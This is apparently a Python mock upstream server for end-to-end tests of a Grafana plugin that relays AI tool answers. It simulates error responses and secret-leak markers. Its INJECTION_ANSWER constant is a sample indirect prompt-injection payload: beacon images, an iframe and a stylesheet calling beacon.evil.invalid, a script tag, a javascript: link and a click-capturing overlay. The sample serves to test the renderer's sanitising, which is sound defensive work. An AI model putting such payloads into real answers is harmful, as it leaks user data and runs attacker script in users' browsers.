#!/usr/bin/env python3
"""Minimal dot-ai upstream stub for by-design e2e tests.

Endpoints mirror the tools REST paths the Grafana plugin proxies to.
Body markers (in intent/issue) drive failure modes without a second framework.

RESPONSE SHAPE CONTRACT: the success payloads below deliberately encode
``{"success": true, "data": {"result": {"summary": ...}}}`` because that is what
the plugin's envelope walk parses — see ``extractSummary`` in
``pkg/plugin/resources.go`` (result.summary|analysis|message, then data.summary,
then top-level summary) and ``extractConnected`` for the /version probe shape.
Change one and this stub stops exercising the real parse path.

HIT COUNTERS: every POST bumps a per-tool counter and, when the body carries a
``DIALPROBE-<id>`` token, a per-probe counter. Both are served from GET /healthz
so e2e deny-path specs can assert "403 with no upstream dial" as a measurement
instead of an inference. Per-probe counters are what deny tests assert on: the
suite runs fullyParallel, so per-tool totals move under allow-path tests.
"""

from __future__ import annotations

import json
import os
import re
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST = "0.0.0.0"
# 8080 inside the container (docker-compose publishes it on host 18080);
# override when running the stub bare on a host where 8080 is taken.
PORT = int(os.environ.get("DOT_AI_STUB_PORT", "8080"))

# Unique markers — must NEVER appear in Grafana browser/plugin resource responses.
UPSTREAM_SECRET_MARKER = "UPSTREAM_SECRET_STACK_DO_NOT_LEAK"
UPSTREAM_INTERNAL_FIELD = "raw_upstream_internal_do_not_leak"

# Indirect prompt-injection payload: what a crafted Loki line, alert annotation, or
# Kubernetes object name could realistically get echoed into a model answer. Served on
# TRIGGER_INJECTION_MARKDOWN so the renderer's allowlist is exercised through the real
# page instead of only in jsdom. The beacon host is `.invalid` (RFC 6761 — never
# resolves), so a surviving embed shows up as an outbound request the spec counts,
# never as traffic to a real third party.
INJECTION_BEACON_HOST = "beacon.evil.invalid"
INJECTION_ANSWER = "\n".join(
    [
        "INJECTED_ANSWER_START",
        "",
        "## Cluster findings",
        "",
        "- pod api-7d9 is CrashLooping",
        "",
        f'<img src="https://{INJECTION_BEACON_HOST}/pixel.gif?e=leak">',
        f'<iframe src="https://{INJECTION_BEACON_HOST}/frame" width="1" height="1"></iframe>',
        f'<link rel="stylesheet" href="https://{INJECTION_BEACON_HOST}/x.css">',
        "<script>window.__pwned = 'script';</script>",
        '<div onclick="window.__pwned = \'handler\'" '
        'style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</div>',
        "",
        f"![beacon](https://{INJECTION_BEACON_HOST}/md.gif)",
        "",
        "[click me](javascript:window.__pwned='jsurl')",
        "",
        "[runbook](https://runbooks.example/crashloop)",
        "",
        "INJECTED_ANSWER_END",
    ]
)

_lock = threading.Lock()
_hits: dict[str, int] = {
    "version": 0,
    "query": 0,
    "remediate": 0,
    "other": 0,
}
# Per-request dial probes: DIALPROBE-<id> tokens seen in any POST body.
_probes: dict[str, int] = {}
_PROBE_RE = re.compile(r"DIALPROBE-[A-Za-z0-9_-]+")


def _bump(path: str) -> None:
    key = "other"
    if path.endswith("/version"):
        key = "version"
    elif path.endswith("/query"):
        key = "query"
    elif path.endswith("/remediate"):
        key = "remediate"
    with _lock:
        _hits[key] = _hits.get(key, 0) + 1


def _record_probes(raw: bytes) -> None:
    if not raw:
        return
    tokens = _PROBE_RE.findall(raw.decode("utf-8", "replace"))
    if not tokens:
        return
    with _lock:
        for token in tokens:
            _probes[token] = _probes.get(token, 0) + 1


class Handler(BaseHTTPRequestHandler):
    server_version = "dot-ai-stub/1.0"

    def log_message(self, fmt: str, *args) -> None:  # quiet CI logs
        pass

    def _read_json(self) -> dict:
        length = int(self.headers.get("Content-Length") or "0")
        raw = self.rfile.read(length) if length else b""
        _record_probes(raw)
        if not raw:
            return {}
        try:
            data = json.loads(raw.decode("utf-8"))
            return data if isinstance(data, dict) else {}
        except json.JSONDecodeError:
            return {}

    def _write(self, status: int, body: dict | list | str, content_type: str = "application/json") -> None:
        if isinstance(body, (dict, list)):
            payload = json.dumps(body).encode("utf-8")
        else:
            payload = str(body).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self) -> None:
        if self.path in ("/healthz", "/"):
            with _lock:
                hits = dict(_hits)
                probes = dict(_probes)
            self._write(200, {"ok": True, "hits": hits, "probes": probes})
            return
        self._write(404, {"error": {"message": "not found"}})

    def do_POST(self) -> None:
        path = self.path.split("?", 1)[0]
        _bump(path)
        # Probe tokens may arrive in the body (tool calls forward it) or in the
        # request path (test-connection forwards only a draft apiUrl, so the
        # probe rides in that URL's path segment).
        _record_probes(self.path.encode("utf-8"))
        body = self._read_json()
        auth = self.headers.get("Authorization", "")

        # Always require Bearer so a missing key is visible in dial failures.
        if not auth.startswith("Bearer "):
            self._write(
                401,
                {
                    "error": {"message": "missing bearer"},
                    UPSTREAM_INTERNAL_FIELD: UPSTREAM_SECRET_MARKER,
                },
            )
            return

        text = " ".join(
            str(body.get(k) or "")
            for k in ("intent", "issue", "query", "prompt")
        )

        if path.endswith("/version") or path.endswith("/api/v1/tools/version"):
            self._write(200, {"success": True, "data": {"connected": True, "version": "stub-1.0"}})
            return

        if path.endswith("/query") or path.endswith("/api/v1/tools/query"):
            self._handle_tool(text, body, tool="query")
            return

        if path.endswith("/remediate") or path.endswith("/api/v1/tools/remediate"):
            # If execute/apply leak past the plugin allowlist, surface a distinctive marker.
            leaked = [k for k in ("execute", "apply", "mode", "confirm") if k in body]
            if leaked:
                self._write(
                    200,
                    {
                        "success": True,
                        "data": {
                            "result": {
                                "summary": f"STUB_SAW_EXECUTE_KEYS:{','.join(leaked)}",
                            }
                        },
                    },
                )
                return
            self._handle_tool(text, body, tool="remediate")
            return

        self._write(404, {"error": {"message": f"unknown path {path}"}})

    def _handle_tool(self, text: str, body: dict, tool: str) -> None:
        if "TRIGGER_UPSTREAM_5XX" in text:
            self._write(
                503,
                {
                    "message": "generic upstream failure",
                    "error": {"message": "service unavailable"},
                    "debug_stack": UPSTREAM_SECRET_MARKER,
                    UPSTREAM_INTERNAL_FIELD: UPSTREAM_SECRET_MARKER,
                },
            )
            return
        if "TRIGGER_UPSTREAM_403" in text:
            self._write(
                403,
                {
                    "error": {"message": "upstream forbidden"},
                    "debug_stack": UPSTREAM_SECRET_MARKER,
                    UPSTREAM_INTERNAL_FIELD: UPSTREAM_SECRET_MARKER,
                },
            )
            return
        if "TRIGGER_UPSTREAM_401" in text:
            self._write(
                401,
                {
                    "error": {"message": "upstream unauthorized"},
                    "debug_stack": UPSTREAM_SECRET_MARKER,
                    UPSTREAM_INTERNAL_FIELD: UPSTREAM_SECRET_MARKER,
                },
            )
            return
        if "TRIGGER_INJECTION_MARKDOWN" in text:
            # Answer text is fully attacker-influenceable; the renderer must treat it so.
            self._write(
                200,
                {
                    "success": True,
                    "data": {"result": {"summary": INJECTION_ANSWER}},
                },
            )
            return

        summary = f"stub-{tool}-ok"
        if text.strip():
            summary = f"stub-{tool}-ok: {text.strip()[:80]}"
        self._write(
            200,
            {
                "success": True,
                "data": {"result": {"summary": summary}},
                # Must never appear in the plugin envelope.
                UPSTREAM_INTERNAL_FIELD: UPSTREAM_SECRET_MARKER,
            },
        )


def main() -> None:
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"dot-ai-stub listening on {HOST}:{PORT}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
